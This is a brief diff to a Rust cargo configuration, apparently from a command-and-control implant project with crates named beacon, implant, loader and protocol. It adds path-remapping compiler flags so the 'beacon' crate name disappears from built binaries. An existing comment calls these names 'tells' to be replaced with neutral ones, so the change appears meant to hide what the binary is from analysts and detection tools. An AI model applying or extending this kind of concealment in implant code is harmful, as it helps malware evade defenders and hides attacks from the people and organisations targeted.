@@ -23,10 +23,12 @@ rustflags = [
   # workspace crate paths (relative, as cargo passes them) — backslash form.
   # "implant"/"loader"/"protocol" are tells → neutral names. (The source files
   # inside are already neutral: stubs.rs / exec.rs / coff.rs / main.rs / lib.rs.)
+  "--remap-path-prefix=crates\\beacon=app",
   "--remap-path-prefix=crates\\implant=app",
   "--remap-path-prefix=crates\\loader=core",
   "--remap-path-prefix=crates\\protocol=net",
   # forward-slash form (some rustc invocations use /)
+  "--remap-path-prefix=crates/beacon=app",
   "--remap-path-prefix=crates/implant=app",
   "--remap-path-prefix=crates/loader=core",
   "--remap-path-prefix=crates/protocol=net",
